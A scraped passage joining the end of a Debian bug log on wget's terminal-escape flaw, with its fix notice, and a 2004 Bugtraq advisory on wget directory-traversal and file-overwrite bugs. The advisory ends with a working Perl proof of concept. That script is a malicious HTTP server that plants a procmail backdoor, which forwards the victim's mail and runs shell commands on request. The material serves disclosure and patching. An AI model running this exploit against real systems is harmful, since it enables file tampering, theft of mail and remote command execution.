printing untrusted strings (those coming from the remote server).

Newlines and TABs are escaped, which makes it much harder to mimic
Wget's output, at least without knowing the exact width of the
terminal.

```

---

**Reply sent** to `Noèl Köthe <noel@debian.org>`:

You have taken responsibility.
([full text](bugreport.cgi?bug=261755;msg=105), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=105), [link](#104)).

---

**Notification sent** to `Jan Minar <jjminar@fastmail.fm>`:

Bug acknowledged by developer.
([full text](bugreport.cgi?bug=261755;msg=107), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=107), [link](#106)).

---

[Message #108](#108) received at 261755-close@bugs.debian.org ([full text](bugreport.cgi?bug=261755;msg=108), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=108), reply):

![](/cgi-bin/libravatar.cgi?email=noel%40debian.org)
From: Noèl Köthe <noel@debian.org>
To: 261755-close@bugs.debian.org
Subject: Bug#261755: fixed in wget 1.9.1-11
Date: Thu, 05 May 2005 17:03:19 -0400
```
Source: wget
Source-Version: 1.9.1-11

We believe that the bug you reported is fixed in the latest version of
wget, which is due to be installed in the Debian FTP archive:

wget_1.9.1-11.diff.gz
  to pool/main/w/wget/wget_1.9.1-11.diff.gz
wget_1.9.1-11.dsc
  to pool/main/w/wget/wget_1.9.1-11.dsc
wget_1.9.1-11_i386.deb
  to pool/main/w/wget/wget_1.9.1-11_i386.deb

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 261755@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Noèl Köthe <noel@debian.org> (supplier of updated wget package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Format: 1.7
Date: Thu, 05 May 2005 22:58:58 +0200
Source: wget
Binary: wget
Architecture: source i386
Version: 1.9.1-11
Distribution: unstable
Urgency: high
Maintainer: Noèl Köthe <noel@debian.org>
Changed-By: Noèl Köthe <noel@debian.org>
Description:
 wget       - retrieves files from the web
Closes: [261755](bugreport.cgi?bug=261755) [284875](bugreport.cgi?bug=284875) [305425](bugreport.cgi?bug=305425)
Changes:
 wget (1.9.1-11) unstable; urgency=high
 .
   * going back to -8 status to have minimal changes to current
     sarge version
   * backported fixes from Hrvoje Niksic/upstream from wget 1.10
     cvs version (thanks alot Hrvoje Niksic!):
     - adds the filtering of control chars
       (closes: Bug#[261755](bugreport.cgi?bug=261755))
     - prevents hosts named ".." from writing to ../. and
       prevents "%00" truncating C strings that hold URLs
       (closes: Bug#[284875](bugreport.cgi?bug=284875))
   * removed unneeded texi2html build-dep
     (closes: Bug#[305425](bugreport.cgi?bug=305425))
Files:
 ba4c07b0f2a9981892537cafd67db973 587 web optional wget_1.9.1-11.dsc
 1421b183f36da51ee3d39377cfae5db5 17197 web optional wget_1.9.1-11.diff.gz
 f200df94d7cb8dc369bcd973d0576ae8 425918 web optional wget_1.9.1-11_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.0 (GNU/Linux)

iD8DBQFCeoQl9/DnDzB9Vu0RAgNiAJ4w+fXh7GnvM9l6ofVryTol22RyTQCeJjGc
ulkXZX2xdW1kUlublPyy0sg=
=868g
-----END PGP SIGNATURE-----

```

---

**Bug reopened, originator not changed.**
Request was from `Frank Lichtenheld <djpig@debian.org>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=261755;msg=110), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=110), [link](#109)).

---

**Tags added: sarge**
Request was from `Frank Lichtenheld <djpig@debian.org>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=261755;msg=112), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=112), [link](#111)).

---

**Bug closed, send any further explanations to Jan Minar <jjminar@fastmail.fm>**
Request was from `Frank Lichtenheld <djpig@debian.org>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=261755;msg=114), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=114), [link](#113)).

---

**Tags removed: sarge**
Request was from `Frank Lichtenheld <djpig@debian.org>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=261755;msg=116), [mbox](bugreport.cgi?bug=261755;mbox=yes;msg=116), [link](#115)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=261755).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 25 13:22:17 2025;
Machine Name:
bembo

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from marc.info_78c3767d_20250125_132219.html ===

```
[[prev in list](?l=bugtraq&m=110261302728309&w=2)] [[next in list](?l=bugtraq&m=110261160330482&w=2)] [[prev in thread](?l=wget&m=110266243122506&w=2)] [[next in thread](?l=wget&m=110268079110630&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [wget: Arbitrary file overwriting/appending/creating and other vulnerabilities](?t=110266250200001&r=1&w=2)
From:       [Jan Minar <jjminar () FastMail ! FM>](?a=107767099200001&r=1&w=2)
Date:       [2004-12-09 9:14:38](?l=bugtraq&r=1&w=2&b=200412)
Message-ID: [20041209091438.GA15010 () kontryhel ! haltyr ! dyndns ! org](?i=20041209091438.GA15010%20()%20kontryhel%20!%20haltyr%20!%20dyndns%20!%20org)
[Download RAW [message](?l=bugtraq&m=110269474112384&q=mbox) or [body](?l=bugtraq&m=110269474112384&q=raw)]

[[Attachment #2 (multipart/mixed)]](?l=bugtraq&m=110269474112384&q=p2)

------------------------------------------------------------------------
Summary
------------------------------------------------------------------------
Product:   wget
Versions:  1.8.x
Versions:  1.9.x (to lesser extent)
Versions:  Versions < 1.8 are probably vulnerable too
Platforms: Linux, probably POSIX, others?
Tested:    1.8.1-6 (Debian Woody)
           1.9.1-4 (Debian Sarge)
Problems:  Overwriting/appending/creating files and directories
           Retrieving file existence, size, permissions info
	   Etc.
Remote?:   Both remote and local
Author:	   Jan Minar <jjminar foo fastmail bar fm>

------------------------------------------------------------------------
Background
------------------------------------------------------------------------

``GNU wget is a free software package for retrieving files using HTTP,
HTTPS and FTP, the most widely-used Internet protocols. It is a
non-interactive commandline tool, so it may easily be called from
scripts, cron jobs, terminals without X-Windows [sic!] support, etc.''

	-- <http://www.gnu.org/software/wget/wget.html>

wget(1) is the de facto standard HTTP retrieval program on GNU/Linux,
both for interactive use and for use in scripts and programs.  76
packages in the Debian Sarge currently depend on the wget package.

------------------------------------------------------------------------
Vulnerabilities
------------------------------------------------------------------------

(0) Wget authors are/were incompetent.  Everything else is a corollary.

In the current maintainer's own words: ``[T]he code is buggy, poorly
commented, very hard to understand, extremely resistant to changes and
looks like a bunch of patches put together in a careless way.
[I]t badly needs a lot of auditing and rewriting.''

	-- Mauro Tortonesi in a private mail exchange with me

Note: Wget has numerous commandline options which are relevant to these
vulnerabilities.

(1) Wget doesn't know which files it is permitted to write to

Wget erroneously thinks that the current directory is a fair game, and
will happily write in any file in and below it.  Malicious HTTP response
or malicious HTML file can redirect wget to a file that is vital to the
system, and wget will create/append/overwrite it.

$ cd /home/user
$ wget <http://localhost/wgettrap.bashrc>
	-> .bashrc

(2) Wget doesn't sanitize the redirection data properly

Wget apparently has at least two methods of ``sanitizing'' the
potentially malicious data it receives from the HTTP stream, therefore a
malicious redirects can pass the check.  We haven't find a way to trick
wget into writing above the parent directory, which doesn't mean it's
not possible.

# cd /root [[1]](#1)
# wget -x <http://localhost/wgettrap.redirect-1.9>
	-> ../lib/libc-2.2.5.so   [[2]](#2)

$ cd /foo/bar
$ wget -r <http://localhost/wgettrap.redirect-1.8>
$	-> ../../../../../../../../../home/jan/.bashrc	[[1]](#1)
	-> ../../../../../../../../../var/www/jan/.htaccess

[[1]](#-1) If inetd is not running on the system, the user name can be
social-engineered, or guessed from preceding traffic.

[[2]](#-2) '..' must resolve to an IP address of the malicious server, or at
least to an address, provided that we will be able to stuff data in the
HTTP stream afterwards.  The POC doesn't exploit this.

(3) Wget prints control characters to the terminal verbatim

Malicious HTTP response can overwrite parts of the terminal so that the
user will not notice anything wrong, or will believe the error was not
fatal.  See the [[1]](#1)Debian bug #261755 for details.

[[1]](#-1) <http://bugs.debian.org/261755>

(4) Just about any stupid hack will work with wget.  %00 bytes (see the
POC) and other %-escaped control characters handling, symlink attacks:

	$ cd /tmp
	$ ln -s index.html /path/to/foo
	$ wget -x <http://localhost/>
		-> /path/to/foo

------------------------------------------------------------------------
Reproduction
------------------------------------------------------------------------

A proof of concept is attached.

------------------------------------------------------------------------
Patched versions
------------------------------------------------------------------------

Not available.

------------------------------------------------------------------------
Workarounds
------------------------------------------------------------------------

(1) Don't use programs/scripts which use wget internally.

(2) Use alternative retrieval programs, such as pavuk, axel, or
ncftpget.

(3) Use the -o and -O options.

(4) Create two levels of new directories, cd to the directories, only
then run wget (won't protect you when using version <= 1.8 with
'-x' or '-r'):

   	$ mkdir sand/box
	$ cd sand/box
	$ wget <http://localhost/>

------------------------------------------------------------------------
Bug history
------------------------------------------------------------------------

We discovered this bug few months earlier.  We contacted the Debian
package maintainer and the Debian Security Team on 2004-10-03.  The wget
maintainer had not been responding to emails at that time, so we didn't
contact him.  Few days ago, a new maintainer was appointed, who
[[1]](#-1)disclosed this vulnerability.

[[1]](#-1) <http://wget-bugs.ferrara.linux.it/msg12>

--
 )^o-o^|    jabber: rdancer@NJS.NetLab.Cz
 | .v  K    e-mail: jjminar FastMail FM
 `  - .'     phone: +44(0)7981 738 696
  \ __/Jan     icq: 345 355 493
 __|o|__Mináø  irc: rdancer@IRC.FreeNode.Net

[["wgettrap.poc" (text/plain)]](?l=bugtraq&m=110269474112384&q=p5)

#!/usr/bin/perl -W
# wgettrap.poc -- A POC for the wget(1) directory traversal vulnerability
#
# Copyright 2004 Jan MinÃ¡Å (jjminar fastmail fm)
# License: Public Domain
#
# When wget connects to us, we send it a HTTP redirect constructed so that wget
# wget will connect the second time, it will be attempting to override
# ~/.procm4ilrc (well, provided that the user running wget has username 'jan'
# 8-)).

use POSIX qw(strftime);

# This is our scheme/host/port
$server = "<http://localhost:31340>";
# Use this + DNS poisoning with wget 1.9 & CVS
#$server = "http://..";

# Wanna know who got infected?
#$log = "/dev/pts/1";

# The filename we will try to overwrite on the target system
$filename = "/home/jan/.procm4ilrc%00This%20part%20will%20be%20ignored.";

############### Payload #########################################
$email = 'your@mailbox';
$password = 'Pmrpuf ner cevzvgvirf';
$payload = <<EOP;
:0c
| mail -s 'Wgettrap mail copy' $email
:0
* ^X-Wgettrap-Command: shell
* ^X-Wgettrap-Password: $password
| /bin/sh -c '/bin/sh | mail -s "Wgettrap shell output" $email'
EOP
chomp $payload;
############### Payload #########################################

# A simple directory traversal, for greater effect
$trick = "/.." . "%2f.." x 40;

open LOG, ">$log" if $log;

while(<STDIN>){
	print LOG $_ if $log;
	if (/\Q$trick$filename\E/) {
	#if (/%2f/) {
		# We see the filename, so this is the second time
		# they're here.  Time to feed the sploit.
		$second++;
	} elsif (/^Range: bytes=\(33\)-/) {
		# Appending goes like this:
		# (1) Tell'em what you're gonna tell'em
		# (2) Then tell'em just a half
		# (3) Close it
		# (4) Wait
		# (5) They're comin' back, with wget -c
		# (6) Tell'em the sploit
		# (7) Close again
		# (8) Wtf? They're comin' back with wget -c again
		# (9) Tell'em the rest...
		# (10) ... enjoying the backdoor at the same time
		print LOG "File if $1 bytes long\n" if $log;
	} elsif (/^\r?$/) {
		# The HTTP headers are over.  Let's do it!
		$date = strftime ("%a, %e %b %Y %H:%M:%S %z", localtime);
		if (!$second) {
			# Print the payload
			print <<EOT;
HTTP/1.1 301 Moved Permanently\r
Date: $date\r
Server: wgettrap 1.1\r
Accept-Ranges: bytes\r
Location: $server$trick$filename\r
Content-Length: 43\r
Connection: close\r
Content-Type: text/html\r
\r
<html><head><title></title></head></html>\r
EOT
		} else {
			# Print the redirection
			print <<EOT;
HTTP/1.1 200 OK\r
Date: $date\r
Server: wgettrap 1.1\r
Accept-Ranges: bytes\r
Content-Length: 25\r
Connection: close\r
Content-Type: text/plain\r
\r
$payload
EOT
		}
		exit 0;
	}
}

[[Attachment #6 (application/pgp-signature)]](?l=bugtraq&m=110269474112384&q=p6)

[[prev in list](?l=bugtraq&m=110261302728309&w=2)] [[next in list](?l=bugtraq&m=110261160330482&w=2)] [[prev in thread](?l=wget&m=110266243122506&w=2)] [[next in thread](?l=wget&m=110268079110630&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


